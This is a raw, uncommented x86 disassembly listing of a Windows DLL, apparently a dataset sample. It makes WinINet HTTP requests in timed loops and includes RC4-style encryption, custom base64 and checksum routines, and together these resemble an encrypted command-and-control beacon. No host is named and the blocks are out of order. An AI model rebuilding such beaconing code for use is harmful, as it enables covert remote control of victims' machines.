call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ HttpSendRequestW@IAT ]
test eax eax
je r-xdata
push edi
call sub_10009181
add esp 0x4
jmp r-xdata
mov edx [ ebx + 0x38 ]
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ ebx + 0x14 ] edx
call esi
mov eax [ ebp - 0x1c ]
push eax
call esi
mov ecx [ ebp - 0x20 ]
push ecx
call esi
mov edx [ ebp - 0xc ]
push edx
call sub_10009181
add esp 0x4
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x15
push esi
mov [ ebp - 0x4 ] 0x0
call [ HttpQueryInfoW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
push 0x1
push edx
call sub_100091bb
add esp 0x8
push 0x0
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x13
push esi
call [ HttpQueryInfoW@IAT ]
cmp [ edi ] 0x300032
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x38 ]
jae r-xdata
mov eax [ ebx + 0x1c ]
lea edx [ eax + 0x1 ]
mov ecx [ ebx + 0x38 ]
push edi
mov [ ebx + 0x14 ] ecx
call sub_10009181
mov edx [ ebp - 0xc ]
push edx
call sub_10009181
add esp 0x8
jmp r-xdata
cmp [ edi + 0x4 ] 0x30
jne r-xdata
mov ecx [ ebx + 0x40 ]
add ecx eax
mov [ ebx + 0x14 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax 0x7
cmp edi eax
jae r-xdata
cmp [ edi + 0x5 ] 0x0
jne r-xdata
push 0x8
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_10009181
add esp 0x4
jmp r-xdata
push edi
call sub_10009181
add esp 0x4
xor edi edi
push edi
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x4 ]
push edx
push 0x20000005
push esi
mov [ ebp - 0x24 ] 0x4
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
xor esi esi
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov esi eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
mov [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x1
push eax
mov [ ebp - 0x18 ] edi
call sub_100091bb
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edi
test edi edi
je r-xdata
call sub_10005ed0
push ebx
mov eax esi
call sub_10006d70
mov edi eax
mov [ ebp - 0x20 ] edi
test esi esi
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
mov eax [ ebp - 0x1c ]
push eax
call esi
mov ecx [ ebp - 0x20 ]
push ecx
call esi
mov edx [ ebp - 0xc ]
push edx
call sub_10009181
add esp 0x4
test edi edi
je r-xdata
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
push edx
push eax
mov eax [ ebp - 0x10 ]
add eax edi
push eax
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebx + 0x3c ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebx + 0x44 ]
mov [ ebx + 0x14 ] edx
call sub_10005630
jmp r-xdata
add edi [ ebp - 0x18 ]
cmp edi [ ebp - 0x4 ]
jne r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
call [ InternetQueryDataAvailable@IAT ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
sub_10006800
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x8 ] 0x0
push 0x1f4
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x4 ] 0x0
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
push eax
push ebx
call sub_10006b10
mov esi eax
mov eax [ ebx + 0x10 ]
lea edx [ eax + 0x2 ]
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edi [ esi + 0x4 ]
sub eax edx
sar eax 0x1
lea eax [ edi + eax + 0x2 ]
push 0x2
push eax
call sub_100091bb
push 0x2
push edi
mov [ ebp - 0x4 ] eax
call sub_100091bb
mov ecx [ esi ]
add esp 0x10
mov edi eax
mov eax [ esi + 0x4 ]
push eax
push edi
push eax
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov ecx [ ebx + 0x10 ]
mov eax ecx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x14 ] edx
lea ecx [ ecx ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax [ ebp - 0x14 ]
sar eax 0x1
push eax
mov eax [ ebp - 0x4 ]
push ecx
push eax
call sub_10009be4
mov ecx [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
push ecx
push edi
push edx
call sub_10009be4
mov eax [ esi ]
add esp 0x18
test eax eax
je r-xdata
push esi
call sub_10008d40
push edi
call sub_10009181
mov eax [ ebx + 0xc ]
add esp 0x8
push eax
push ebx
call sub_10006b10
mov esi [ ebx + 0xc ]
xor edi edi
mov [ ebp - 0x14 ] eax
cmp eax edi
jne r-xdata
push eax
call sub_10009181
add esp 0x4
cmp esi edi
je r-xdata
cmp esi edi
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ esi ]
cmp eax edi
je r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
mov edx [ ebx + 0x34 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x50
push edx
push eax
call [ InternetConnectW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_10009181
add esp 0x4
jmp r-xdata
push esi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
push esi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
mov edi [ ebp - 0x4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edi
push r--data
push ebx
call [ HttpOpenRequestW@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_10009181
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp eax 0x5
jl r-xdata
mov edi [ HttpAddRequestHeadersW@IAT ]
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
mov ecx [ ebp - 0x14 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
push 0x0
push 0x0
push esi
call [ HttpSendRequestW@IAT ]
test eax eax
je r-xdata
push edi
call sub_10009181
add esp 0x4
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
call [ InternetOpenW@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edi [ InternetCloseHandle@IAT ]
push ecx
call edi
push esi
call edi
push ebx
call edi
push 0xbb8
call [ Sleep@IAT ]
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push 0x0
push 0x16
push esi
mov [ ebp - 0x8 ] 0x0
call [ HttpQueryInfoW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
push 0x1
push edx
call sub_100091bb
add esp 0x8
push 0x0
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push 0x13
push esi
call [ HttpQueryInfoW@IAT ]
cmp [ edi ] 0x300032
jne r-xdata
push esi
call sub_10008d40
mov ecx [ ebp - 0x4 ]
push ecx
call sub_10009181
add esp 0x8
mov [ ebx + 0xc ] 0x0
push eax
call sub_10009181
add esp 0x4
push edi
call sub_10009181
add esp 0x4
cmp [ edi + 0x4 ] 0x30
jne r-xdata
cmp [ edi + 0x5 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edi
mov [ edx + 0x4 ] 0x1
call sub_10009181
mov eax [ ebp - 0x10 ]
mov edi [ InternetCloseHandle@IAT ]
add esp 0x4
push eax
call edi
push esi
call edi
push ebx
call edi
mov ebx [ ebp + 0x8 ]
sub_10006b10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0xc
push ebx
push esi
mov esi [ eax + 0x1c ]
push edi
lea eax [ esi + 0x1 ]
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ecx + 0x4 ]
sub esi eax
add edi esi
push 0x1
push edi
call sub_100091bb
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ edx + 0x1c ]
push esi
push eax
push esi
push ebx
call sub_10009225
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
push eax
push ecx
push eax
lea edx [ ebx + esi ]
push edx
call sub_10009225
push 0x8
call sub_10008d9c
add esp 0x2c
test eax eax
je r-xdata
xor edi edi
mov [ eax + 0x4 ] edi
mov [ eax ] ebx
mov edi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call [ GetTickCount@IAT ]
push eax
call sub_10009855
lea ecx [ ebp - 0x4 ]
push ecx
call sub_10009a34
mov eax [ ebp - 0x4 ]
mov edx eax
shr edx 0x10
xor edx eax
movzx ecx dx
mov [ ebp - 0xc ] ecx
mov edi [ esi + 0x4 ]
mov edx [ esi ]
add esp 0x8
call sub_10007060
movzx eax ax
mov [ ebp - 0x8 ] eax
mov ebx [ esi + 0x4 ]
add ebx 0x4
push 0x1
push ebx
call sub_100091bb
push 0x2
lea ecx [ ebp - 0x8 ]
push ecx
mov edi eax
push 0x2
push edi
call sub_10009225
push 0x2
lea edx [ ebp - 0xc ]
push edx
lea eax [ edi + 0x2 ]
push 0x2
push eax
call sub_10009225
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
push ecx
push eax
lea edx [ edi + 0x4 ]
push edx
call sub_10009225
mov eax [ esi ]
add esp 0x38
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10006cd0
mov esi eax
test edi edi
je r-xdata
push esi
call sub_10008d40
add esp 0x4
push ebx
push edi
call sub_100071a0
push edi
mov esi eax
call sub_10009181
add esp 0x4
call sub_100063d0
mov edi [ esi + 0x4 ]
add edi 0x7
push 0x1
push edi
mov [ ebp + 0x8 ] eax
call sub_100091bb
mov ebx eax
mov eax [ ebp + 0x8 ]
push 0x7
push eax
push 0x7
push ebx
call sub_10009225
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
push ecx
push eax
lea edx [ ebx + 0x7 ]
push edx
call sub_10009225
mov eax [ esi ]
add esp 0x28
test eax eax
je r-xdata
push eax
call sub_10009181
add esp 0x4
push edi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
push esi
call sub_10008d40
mov eax [ ebp + 0x8 ]
push eax
call sub_10009181
push 0x8
call sub_10008d9c
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10009181
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10006cd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
call [ GetTickCount@IAT ]
push eax
call sub_10009855
lea eax [ ebp - 0x4 ]
push eax
call sub_10009a34
mov edx [ ebp - 0x4 ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
add esp 0x8
push edx
push eax
mov eax [ ebp + 0x8 ]
push ecx
call sub_10006f70
cmp al 0x1
je r-xdata
push ebx
push esi
mov esi [ edi + 0x4 ]
add esi 0x4
push 0x1
push esi
call sub_100091bb
mov ebx eax
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push esi
push ebx
call sub_10009225
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
push ecx
push edx
lea eax [ esi - 0x4 ]
push eax
lea ecx [ ebx + 0x4 ]
push ecx
call sub_10009225
push 0x8
call sub_10008d9c
add esp 0x2c
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10006d70
push ebp
mov ebp esp
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
push esi
add eax 0x7
add ecx 0xfffffff9
push eax
call sub_10007360
mov esi eax
test esi esi
jne r-xdata
push ebx
mov ebx [ esi ]
mov cx [ ebx + 0x2 ]
push edi
mov edi [ esi + 0x4 ]
lea edx [ ebx + 0x4 ]
lea edi [ edi - 0x4 ]
call sub_10007060
cmp [ ebx ] ax
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ edx ]
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
push edx
add eax 0xfffffff8
push eax
add ebx 0x8
push ebx
mov eax edi
call sub_10006f70
cmp al 0x1
je r-xdata
test ebx ebx
je r-xdata
mov edi [ edi + 0x1c ]
mov eax edi
lea edx [ eax + 0x1 ]
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_10008d40
add esp 0x4
push ebx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x1
push eax
call sub_100091bb
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push eax
jmp r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
call sub_10005ed0
pop edi
pop ebx
xor eax eax
pop esi
pop ebp
retn 0x4
call sub_10009181
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ecx eax
mov eax edi
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push ecx
mov ecx [ esi ]
add ecx 0x8
push ecx
sub eax edi
push eax
push ebx
call sub_10009225
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x1c ]
mov eax ecx
add esp 0x10
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
mov edi ebx
cmp eax 0x4
jb r-xdata
test eax eax
je r-xdata
mov edx [ edi ]
cmp edx [ ecx ]
jne r-xdata
push ebx
call sub_10009181
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x1c ]
add esp 0x4
lea ecx [ eax + 0x1 ]
mov dl [ ecx ]
cmp dl [ edi ]
jne r-xdata
mov eax [ esi ]
sub eax 0x4
add ecx 0x4
add edi 0x4
cmp eax 0x4
jae r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ esi + 0x4 ]
sub eax ecx
sub edi eax
sub edi 0x8
push 0x1
push edi
call sub_100091bb
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ edx + 0x1c ]
add esp 0x8
lea ecx [ eax + 0x1 ]
cmp eax 0x1
jbe r-xdata
push esi
call sub_10008d40
push ebx
call sub_10009181
add esp 0x8
pop edi
pop ebx
xor eax eax
pop esi
pop ebp
retn 0x4
push eax
call sub_10009181
add esp 0x4
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov ecx [ esi ]
push edi
lea edx [ ecx + eax + 0x8 ]
push edx
push edi
push ebx
call sub_10009225
mov eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add esp 0x10
cmp eax [ ecx + 0x18 ]
mov eax [ esi ]
jne r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ edi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp eax 0x2
jbe r-xdata
push esi
call sub_10008d40
push 0x8
call sub_10008d9c
add esp 0x8
test eax eax
je r-xdata
push eax
call sub_10009181
add esp 0x4
mov al [ ecx + 0x2 ]
cmp al [ edi + 0x2 ]
je r-xdata
pop edi
pop ebx
xor eax eax
pop esi
pop ebp
retn 0x4
mov [ eax + 0x4 ] edi
pop edi
mov [ eax ] ebx
pop ebx
pop esi
pop ebp
retn 0x4
sub_10006f70
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x1
push 0x100
mov ebx eax
call sub_100091bb
mov ecx [ ebx + 0x28 ]
mov edx [ ebx + 0x2c ]
mov esi eax
push 0x4
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ecx + edx - 0x4 ]
push 0x4
push eax
call sub_10009225
add esp 0x18
xor eax eax
mov [ eax + esi ] al
inc eax
cmp eax 0x100
jne r-xdata
mov edx [ ebx + 0x2c ]
mov eax [ ebx + 0x28 ]
xor edi edi
xor ecx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
movzx edx [ ecx + esi ]
mov [ ebp - 0x1 ] dl
xor edx edx
mov eax ecx
div [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc ecx
movzx edx [ edx + eax ]
mov al [ ebp - 0x1 ]
add edi edx
movzx ebx al
add edi ebx
and edi 0xff
movzx edx [ edi + esi ]
mov [ ecx + esi - 0x1 ] dl
mov [ edi + esi ] al
cmp ecx 0x100
jne r-xdata
xor eax eax
xor ecx ecx
xor edi edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
push esi
call sub_10009181
add esp 0x4
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc ecx
and ecx 0xff
mov dl [ ecx + esi ]
movzx ebx dl
add eax ebx
and eax 0xff
mov bl [ eax + esi ]
mov [ eax + esi ] dl
movzx edx bl
mov [ ecx + esi ] bl
movzx ebx [ eax + esi ]
add edx ebx
and edx 0x800000ff
jns r-xdata
movzx ebx [ edx + esi ]
mov edx [ ebp + 0x8 ]
xor [ edi + edx ] bl
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
dec edx
or edx 0xffffff00
inc edx
sub_10007060
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
mov [ ebp - 0x4 ] esi
cmp edi esi
jbe r-xdata
mov ax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn
push ebx
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov ax [ ebp - 0x4 ]
shr ax 0x1
xor ax cx
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
shr al 0x1
xor al [ ebp - 0x4 ]
test al 0x1
je r-xdata
mov al [ esi + edx ]
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
pop ebx
inc esi
cmp esi edi
jb r-xdata
sub_100071a0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
push esi
lea esi [ eax + eax + 0x8000 ]
push edi
and esi 0xffff8000
mov [ ebp - 0x8 ] eax
add esi 0x8000
lea eax [ esi + 0x40 ]
push 0x1
push eax
xor edi edi
xor ebx ebx
call sub_100091bb
mov ecx eax
add esp 0x8
xor eax eax
mov [ ebp - 0x4 ] ecx
test ecx ecx
jne r-xdata
add ecx esi
lea edx [ ecx + 0x1a ]
mov esi ecx
sub esi edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] esi
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
mov [ ecx ] bl
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x10 ]
lea esi [ ecx + eax + 0x1a ]
add al 0x41
mov [ edx + esi ] al
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x61 ]
inc eax
mov [ esi ] dl
mov [ ebp - 0xc ] eax
cmp eax 0x1a
jl r-xdata
xor eax eax
nop
lea edx [ eax + 0x30 ]
mov [ ecx + eax + 0x34 ] dl
inc eax
cmp eax 0xa
jl r-xdata
mov edx [ ebp + 0xc ]
mov [ ecx + 0x3e ] 0x5f2d
cmp edx 0x3
jb r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov eax 0xaaaaaaab
mul edx
shr edx 0x1
mov [ ebp + 0xc ] edx
jmp r-xdata
mov esi [ ebp - 0x4 ]
cmp eax 0x1
jbe r-xdata
mov edx [ ebp + 0x8 ]
movzx eax [ ebx + edx ]
movzx esi [ ebx + edx + 0x1 ]
shl eax 0x8
xor esi eax
movzx eax [ ebx + edx + 0x2 ]
shl esi 0x8
xor eax esi
mov esi [ ebp - 0x4 ]
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
sub [ ebp - 0x8 ] 0x3
mov [ esi + edi + 0x3 ] dl
shr eax 0x6
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
mov [ esi + edi + 0x2 ] dl
shr eax 0x6
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
shr eax 0x6
mov [ esi + edi + 0x1 ] dl
and eax 0x3f
mov al [ eax + ecx ]
mov edx esi
mov [ edx + edi ] al
add ebx 0x3
add edi 0x4
dec [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ eax + 0x4 ] edi
pop edi
mov [ eax ] esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
movzx eax [ ebx + eax ]
shl eax 0x10
mov edx [ ebp + 0x8 ]
movzx eax [ ebx + edx ]
movzx edx [ ebx + edx + 0x1 ]
shl eax 0x8
add eax edx
shl eax 0x8
jmp r-xdata
add edi 0x4
jmp r-xdata
mov [ esi + edi + 0x2 ] 0x3d
mov esi [ ebp - 0x4 ]
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
mov [ esi + edi + 0x3 ] dl
shr eax 0x6
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
shr eax 0x6
mov [ esi + edi + 0x2 ] dl
mov edx eax
and edx 0x3f
movzx edx [ edx + ecx ]
shr eax 0x6
and eax 0x3f
cmp [ ebp - 0x8 ] 0x1
mov [ esi + edi + 0x1 ] dl
mov al [ eax + ecx ]
mov [ esi + edi ] al
mov [ esi + edi + 0x3 ] 0x3d
jne r-xdata
push 0x8
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
sub_10007360
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov ebx ecx
push 0x1
push 0x100
mov [ ebp - 0x54 ] ebx
call sub_100091bb
mov esi eax
add esp 0x8
mov [ ebp - 0x48 ] esi
xor eax eax
lea ecx [ ecx ]
lea ecx [ eax + 0x41 ]
lea edx [ eax + 0x61 ]
mov [ ebp + eax - 0x44 ] cl
mov [ ebp + eax - 0x2a ] dl
inc eax
cmp eax 0x1a
jl r-xdata
xor eax eax
lea ecx [ eax + 0x30 ]
mov [ ebp + eax - 0x10 ] cl
inc eax
cmp eax 0xa
jl r-xdata
mov [ ebp - 0x6 ] 0x5f2d
xor eax eax
jmp r-xdata
movsx edx [ ebp + eax - 0x44 ]
mov [ edx + esi ] al
inc eax
cmp eax 0x40
jl r-xdata
test bl 0x3
je r-xdata
mov eax ebx
shr eax 0x2
push edi
lea edi [ eax + eax * 2 ]
mov eax [ ebp + 0x8 ]
cmp [ ebx + eax - 0x1 ] 0x3d
mov [ ebp - 0x4c ] edi
jne r-xdata
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + eax - 0x2 ] 0x3d
jne r-xdata
dec edi
mov [ ebp - 0x4c ] edi
push 0x1
push edi
call sub_100091bb
mov ebx eax
add esp 0x8
xor eax eax
mov [ ebp - 0x58 ] ebx
test ebx ebx
je r-xdata
dec edi
mov [ ebp - 0x4c ] edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
xor esi esi
cmp [ ebp - 0x54 ] eax
jbe r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10009181
push 0x8
call sub_10008d9c
add esp 0x8
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
mov cl [ eax + edi ]
mov ebx [ ebp - 0x48 ]
cmp cl 0x3d
jne r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
movzx ecx cl
movsx ecx [ ecx + ebx ]
xor ecx ecx
jmp r-xdata
movzx edx dl
movsx edx [ edx + ebx ]
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x50 ] 0x0
jmp r-xdata
mov dl [ eax + edi + 0x1 ]
inc eax
inc eax
cmp dl 0x3d
jne r-xdata
movzx edx dl
movsx edi [ edx + ebx ]
xor edi edi
jmp r-xdata
mov dl [ eax + edi ]
cmp dl 0x3d
jne r-xdata
movzx edx dl
movsx edx [ edx + ebx ]
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ eax + edx + 0x1 ]
inc eax
cmp dl 0x3d
jne r-xdata
cmp eax [ ebp - 0x54 ]
jb r-xdata
mov edx ecx
sar edx 0x10
mov [ esi + ebx ] dl
inc esi
cmp esi edi
jae r-xdata
mov ebx [ ebp - 0x58 ]
shl ecx 0x6
add ecx [ ebp - 0x50 ]
inc eax
shl ecx 0x6
add ecx edi
mov edi [ ebp - 0x4c ]
shl ecx 0x6
add ecx edx
cmp esi edi
jae r-xdata
mov edx ecx
sar edx 0x8
mov [ esi + ebx ] dl
inc esi
cmp esi edi
jae r-xdata
mov [ esi + ebx ] cl
inc esi
sub_10007520
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x1 ]
cmp edx 0x15f8fe
ja r-xdata
xor al al
pop ebp
retn 0x4
mov [ ecx + 0x38 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_10007540
push ebp
mov ebp esp
push 0xffffffff
push sub_10011c01
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
lea esi [ edi + 0xc ]
xor ebx ebx
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10008c8d
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
lea esi [ edi + 0x24 ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
